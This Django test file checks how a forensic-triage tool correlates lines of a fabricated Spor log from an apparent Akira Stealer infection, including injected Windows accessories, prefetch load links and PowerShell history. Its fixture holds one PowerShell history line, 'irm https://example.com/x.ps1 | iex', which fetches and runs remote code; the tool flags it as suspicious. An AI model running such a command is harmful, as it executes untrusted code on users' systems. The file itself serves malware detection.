"""Spor 0.12.0 (an Akira Stealer case that 0.11.0 called StoatWaffle): the
!injection-host flag (an injected calc / charmap / dllhost), a program's
PREFETCH line linked to the files it loaded (correlations 'loads' /
'loaded_by'), programs a prefetch entry knows by name only ("CHARMAP.EXE"),
a PowerShell history command typed again ("also:" sub-line) and the comment
after the listing; and the same user's FRST log finding Spor's lines."""

from unittest import mock

from django.test import SimpleTestCase, TestCase
from django.urls import reverse

from .. import centralbox, spor_log
from ..correlations.entries import INFO_MATCHES, MATCH_LOADED_BY, MATCH_LOADS, MATCH_NOTES, entry_status
from ..correlations.forward import CORRELATION_VERSION
from ..correlations.spor_self import self_links, self_status
from ..correlations.spor_source import build, pfname_key
from ..file_hashes import normalized_path
from ..log_highlighting import highlight_log, iter_lines
from ..log_layout import analyzed_lines, layout
from ..log_types import LOG_TYPE_SPOR
from ..models import InfectionCase, InfectionCaseLog, UploadedLogFileHash
from .factories import make_uploaded_log, make_user
from .test_correlation_sources import cache_parsed

USER = 'C:\\Users\\anna'
LAUNCHER = USER + '\\Desktop\\LongshotLauncher\\LongshotLauncher.exe'
NODE = USER + '\\.vscode\\nodejs\\node-v22.14.0-win-x64\\node.exe'
NODE_ZIP = USER + '\\.vscode\\nodejs\\node-v22.14.0-win-x64.zip'
PY = USER + '\\AppData\\Local\\Programs\\Python\\Python399\\python3'
PYTHONW = PY + '\\pythonw.exe'
PY_ZIP = PY + '\\python313.zip'
CALC = 'C:\\Windows\\System32\\calc.exe'
DLLHOST = 'C:\\Windows\\System32\\dllhost.exe'
TEMP_DLL = USER + '\\AppData\\Local\\Temp\\x.dll'
CHECK = 'Test-Path "$env:APPDATA\\remotevnc","$env:USERPROFILE\\.vscode\\vscode-bootstrap.cmd"'
HINT = ("(History line 19 only checks for traces of known malware (VS Code bootstrap loader): read-only, like a helper's "
        "check, so no known-malware finding.)")
SHA = 'A' * 64

KNOWN_LAUNCHER = 'known malware Akira Stealer: loaded NODE.EXE and 1 more <==== !known-malware'
KNOWN_NODE = 'known malware Akira Stealer: Node.js its loader installs; sent 165112582 bytes in total <==== !known-malware'
KNOWN_CHARMAP = 'known malware Akira Stealer: loaded PYTHON313.ZIP <==== !injection-host !known-malware'

SPOR = '\n'.join([
    '==================== Spor 0.12.0 - forensic triage log =============================================',
    'Created:   2026-11-27 05:30:49 UTC (local time 22:30, UTC-07:00)',
    'Users:     anna',
    'Times:     UTC, except created and modified in FILES (local time of this PC, as FRST shows them)',
    '',
    '==================== SUMMARY - flagged items; details in the sections below ========================',
    '(line: time [from] item [status] => details <==== flags)',
    '',
    f'2026-11-25 03:57:59 [timeline PF] {LAUNCHER} [gone] => {KNOWN_LAUNCHER}',
    f'2026-11-25 04:13:34 [timeline PCA SRU] {NODE} [gone] => {KNOWN_NODE}',
    f'2026-11-25 22:55:49 [timeline PF] {CALC} <==== !injection-host',
    f'2026-11-25 22:56:02 [timeline PF] CHARMAP.EXE => {KNOWN_CHARMAP}',
    f'2026-11-25 22:56:41 [timeline PF] {DLLHOST} <==== !injection-host',
    '',
    '==================== TIMELINE - last 30 days, oldest first =========================================',
    '(line: time [sources] item [status] => details <==== flags)',
    '',
    f'2026-11-25 03:57:59 [PF] {LAUNCHER} [gone] => {KNOWN_LAUNCHER}',
    f'2026-11-25 04:13:34 [PCA SRU] {NODE} [gone] => {KNOWN_NODE}',
    f'2026-11-25 22:55:49 [PF] {CALC} <==== !injection-host',
    f'2026-11-25 22:56:02 [PF] CHARMAP.EXE => {KNOWN_CHARMAP}',
    f'2026-11-25 22:56:41 [PF] {DLLHOST} <==== !injection-host',
    '2026-11-25 23:10:00 [PF] NOTEPAD.EXE',
    f'2026-11-25 23:56:00 [SRU] {PYTHONW} [gone] => known malware Akira Stealer: fake Python 3.99 loader <==== !known-malware',
    '',
    '==================== PREFETCH - programs run and the files they loaded =============================',
    '(412 .pf files, 296 programs, 256 of them run in the last 30 days (their runs are in the timeline).)',
    '',
    '--- Files loaded by programs run in the last 30 days ---',
    '(Only executables, scripts and archives outside trusted locations. time = program\'s last run.)',
    '(loaded: file [status] <==== flags)',
    '',
    f'2026-11-25 03:57:59 {LAUNCHER} [gone]',
    f'    loaded: {NODE} [gone]',
    f'    loaded: {NODE_ZIP} [gone]',
    f'2026-11-25 22:55:49 {CALC} <==== !injection-host',
    f'    loaded: {TEMP_DLL} [gone]',
    '2026-11-25 22:56:02 CHARMAP.EXE <==== !injection-host',
    f'    loaded: {PY_ZIP} [gone]',
    f'2026-11-25 22:56:41 {DLLHOST} <==== !injection-host',
    f'    loaded: {TEMP_DLL} [gone]',
    '2026-11-25 23:10:00 NOTEPAD.EXE',
    f'2026-11-25 23:56:00 {PYTHONW} [gone]',
    f'    loaded: {PY_ZIP} [gone]',
    f'    loaded: {PY}\\exec.py [gone]',
    '',
    '==================== CLICKFIX - Run dialog, Explorer address bar, PowerShell history ===============',
    '',
    '--- PowerShell console history: ConsoleHost_history.txt ---',
    f'({USER}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt: 57 lines, 1 suspicious.)',
    '(line: line [part] command <==== flags)',
    '',
    '1 [suspicious] irm https://example.com/x.ps1 | iex <==== !suspicious',
    f'57 [last] {CHECK}',
    '    also: lines 19, 31, 39',
    HINT,
    '',
    '==================== NETWORK - data sent per program (SRUM), connections now, DNS cache ============',
    '',
    '--- Data sent and received per program in the last 30 days (SRUM) ---',
    '(line: last seen [user] program [status] => first seen; sent; received <==== flags)',
    '',
    f'2026-11-25 15:48:00 [anna] {NODE} [gone] => first seen 2026-11-25 04:12:00; sent 165112582 bytes; received 44811618 bytes',
    '',
    '==================== FILES - SHA256, signature and version of the files as they are on disk now ====',
    '(line: file => sha256, signature)',
    '',
    f'{CALC} => {SHA}, signature valid; signer Microsoft Windows',
    f'{DLLHOST} => {"B" * 64}, signature valid; signer Microsoft Windows',
    '',
    '==================== LEGEND ========================================================================',
    '!injection-host = Windows accessory (calc, charmap, dllhost) that loaded unsigned code ...',
    '==================== End of log. Scan took 121.0 s ====',
])
LINES = SPOR.split('\n')


def no_of(prefix, start=0):
    """The number of the first line (after `start`) that starts with `prefix` (stripped)."""
    return next(no for no, text in enumerate(LINES, start=1) if no > start and text.strip().startswith(prefix))


def section_line(section, prefix):
    return no_of(prefix, no_of('==================== ' + section))


def linked(links, no):
    """{other line no: match} of a line's links."""
    return {entry['line_no']: entry.get('match') for entry in links.get(str(no), ())}


class FlagTests(SimpleTestCase):
    def test_the_flag_is_strong(self):
        self.assertEqual(spor_log.INJECTION_HOST_FLAG, '!injection-host')
        self.assertEqual(spor_log.flag_tier(spor_log.INJECTION_HOST_FLAG), 'strong')

    def test_an_injected_dllhost_rates_like_a_file(self):
        # dllhost.exe is a command-line host: its lines link as 'host' and never rate, unless one says malware runs in it
        links = self_links('spor', SPOR)
        prefetch = section_line('PREFETCH', f'2026-11-25 22:56:41 {DLLHOST}')
        timeline = section_line('TIMELINE', f'2026-11-25 22:56:41 [PF] {DLLHOST}')
        found = linked(links, prefetch)
        self.assertIsNone(found[timeline])
        self.assertIsNone(found[section_line('FILES', DLLHOST)])
        self.assertEqual(self_status(links[str(prefetch)]), '!')

    def test_an_injected_calc_rates_too(self):
        links = self_links('spor', SPOR)
        files = section_line('FILES', CALC)
        self.assertEqual(self_status(links[str(files)]), '!')


class LoadedTests(SimpleTestCase):
    def setUp(self):
        self.links = self_links('spor', SPOR)

    def test_matches_are_informational(self):
        self.assertTrue({MATCH_LOADS, MATCH_LOADED_BY} <= INFO_MATCHES)
        self.assertEqual(MATCH_NOTES[MATCH_LOADS], 'file this program loaded')
        self.assertEqual(MATCH_NOTES[MATCH_LOADED_BY], 'program that loaded this file')
        self.assertEqual(entry_status({'match': MATCH_LOADED_BY, 'severity': 'b'}), '')

    def test_a_dropper_links_the_node_it_unpacked(self):
        launcher = section_line('PREFETCH', f'2026-11-25 03:57:59 {LAUNCHER}')
        node_timeline = section_line('TIMELINE', f'2026-11-25 04:13:34 [PCA SRU] {NODE}')
        node_network = section_line('NETWORK', f'2026-11-25 15:48:00 [anna] {NODE}')
        found = linked(self.links, launcher)
        self.assertEqual(found[node_timeline], MATCH_LOADS)
        self.assertEqual(found[node_network], MATCH_LOADS)
        # not its own "loaded:" sub-lines
        self.assertNotIn(launcher + 1, found)
        self.assertNotIn(launcher + 2, found)
        self.assertEqual(linked(self.links, node_timeline)[launcher], MATCH_LOADED_BY)
        self.assertEqual(linked(self.links, node_network)[launcher], MATCH_LOADED_BY)
        # the info box names the other file by its full path (its key, as for 'detail' links)
        other = {e['line_no']: e.get('other_path') for e in self.links[str(launcher)]}
        self.assertEqual(other[node_timeline], normalized_path(NODE))
        back = {e['line_no']: e.get('other_path') for e in self.links[str(node_timeline)]}
        self.assertEqual(back[launcher], normalized_path(LAUNCHER))

    def test_loaded_files_do_not_rate_their_loader(self):
        # node.exe is known malware; the launcher's PREFETCH line rates only through its own lines (which say so too)
        launcher = section_line('PREFETCH', f'2026-11-25 03:57:59 {LAUNCHER}')
        rating = [entry for entry in self.links[str(launcher)] if entry.get('match') == MATCH_LOADS]
        self.assertTrue(rating)
        self.assertTrue(all(entry_status(entry) == '' for entry in rating))

    def test_an_injected_accessory_known_by_name_links_its_malwares_library(self):
        charmap = section_line('PREFETCH', '2026-11-25 22:56:02 CHARMAP.EXE')
        pythonw = section_line('PREFETCH', f'2026-11-25 23:56:00 {PYTHONW}')
        found = linked(self.links, charmap)
        self.assertEqual(found[pythonw + 1], MATCH_LOADS)   # pythonw's "loaded: python313.zip"
        self.assertEqual(linked(self.links, pythonw + 1)[charmap], MATCH_LOADED_BY)


class PathlessTests(SimpleTestCase):
    def setUp(self):
        self.links = self_links('spor', SPOR)

    def test_keys(self):
        self.assertEqual(pfname_key('CHARMAP.EXE'), 'pfname:charmap.exe')
        self.assertEqual(pfname_key(CALC), '')
        self.assertEqual(pfname_key('readme.txt'), '')
        self.assertEqual(pfname_key('Defender detected: x.exe'), '')

    def test_the_prefetch_and_timeline_copies_link_by_name(self):
        prefetch = section_line('PREFETCH', '2026-11-25 22:56:02 CHARMAP.EXE')
        timeline = section_line('TIMELINE', '2026-11-25 22:56:02 [PF] CHARMAP.EXE')
        self.assertEqual(linked(self.links, prefetch)[timeline], 'name')
        self.assertEqual(linked(self.links, timeline)[prefetch], 'name')
        # informational: the name alone does not make them one file (two SETUP.EXE in different folders)
        self.assertEqual(self_status([e for e in self.links[str(prefetch)] if e.get('match') == 'name']), '')

    def test_a_bare_name_without_flags_links_without_a_status(self):
        prefetch = section_line('PREFETCH', '2026-11-25 23:10:00 NOTEPAD.EXE')
        timeline = section_line('TIMELINE', '2026-11-25 23:10:00 [PF] NOTEPAD.EXE')
        self.assertEqual(linked(self.links, prefetch)[timeline], 'name')
        self.assertEqual(self_status(self.links[str(prefetch)]), '')

    def test_the_names_stay_in_their_log(self):
        facts = build('spor', LINES)
        keys = [key for key in facts.index if key.startswith('pfname:')]
        self.assertEqual(sorted(keys), ['pfname:charmap.exe', 'pfname:notepad.exe'])


class HistoryTests(SimpleTestCase):
    def setUp(self):
        self.result = highlight_log(LOG_TYPE_SPOR, SPOR)
        self.lines = {line.no: line for line in iter_lines(self.result)}

    def test_a_command_typed_again_is_one_line_with_its_other_numbers(self):
        history = self.lines[no_of('57 [last]')]
        self.assertNotIn('hl-path', {cls for cls, _text in history.tokens})
        also = self.lines[no_of('also: lines 19')]
        self.assertNotIn('hl-path', {cls for cls, _text in also.tokens})

    def test_the_hint_after_the_listing_is_a_comment(self):
        walked = analyzed_lines(SPOR)
        blocks = layout(SPOR, LOG_TYPE_SPOR)
        by_no = {line.line_no: line.index for line in walked}
        history, also, hint = no_of('57 [last]'), no_of('also: lines 19'), no_of(HINT[:30])
        self.assertEqual(blocks.block_of[by_no[history]], blocks.block_of[by_no[also]])
        self.assertNotEqual(blocks.block_of[by_no[history]], blocks.block_of[by_no[hint]])

    def test_no_autodetect_line_rates_the_checked_files(self):
        facts = build('spor', LINES)
        hint, also = no_of(HINT[:30]), no_of('also: lines 19')
        self.assertNotIn(hint, facts.by_line)
        self.assertNotIn(also, facts.by_line)


class CacheTests(SimpleTestCase):
    def test_the_version_changed(self):
        self.assertGreaterEqual(CORRELATION_VERSION, 22)


class SameUserFrstTests(TestCase):
    """The same user's FRST log: its firewall rule for calc.exe and the
    .vscode folder find what Spor says about them."""

    def setUp(self):
        self.firewall = ('FirewallRules: [TCP Query User{A2957171-D8DF-4A9F-8214-E7B3B7B8AF9A}C:\\windows\\system32\\calc.exe]'
                         ' => (Block) C:\\windows\\system32\\calc.exe (Microsoft Windows -> Microsoft Corporation)')
        self.node = f'2026-11-25 04:12 - 2026-11-25 04:12 - 000123456 _____ {NODE}'
        lines = [self.firewall, self.node]
        user = make_user()
        self.client.force_login(user)
        case = InfectionCase.objects.create(owner=user, username='anna', auto_assign_new_items=False)
        frst = make_uploaded_log('frst-akira', log_type='FRST&Addition', forum_username='nobody',
                                 content='\n'.join(['Scan result of Farbar Recovery Scan Tool (FRST)'] + lines))
        cache_parsed(frst, lines)
        spor = make_uploaded_log('spor-akira', log_type='Spor', content=SPOR, forum_username='nobody')
        UploadedLogFileHash.rebuild_for(spor)
        for upload in (frst, spor):
            InfectionCaseLog.objects.create(case=case, uploaded_log=upload)

    def get(self):
        with mock.patch.object(centralbox, '_http_get') as http, mock.patch.object(centralbox, '_request') as request:
            body = self.client.get(reverse('case_correlations_api'), {'upload_id': 'frst-akira'}).json()
        http.assert_not_called()
        request.assert_not_called()
        return body['correlations']

    def spor(self, entries):
        return [entry for entry in entries if entry['upload_id'] == 'spor-akira']

    def test_the_firewall_rule_of_an_injected_calc_finds_spor(self):
        found = self.spor(self.get()[self.firewall])
        self.assertTrue(found)
        self.assertIn('!', {entry_status(entry) for entry in found})

    def test_a_file_of_the_loader_finds_spors_known_malware_line(self):
        found = self.spor(self.get()[self.node])
        self.assertIn('B', {entry_status(entry) for entry in found})
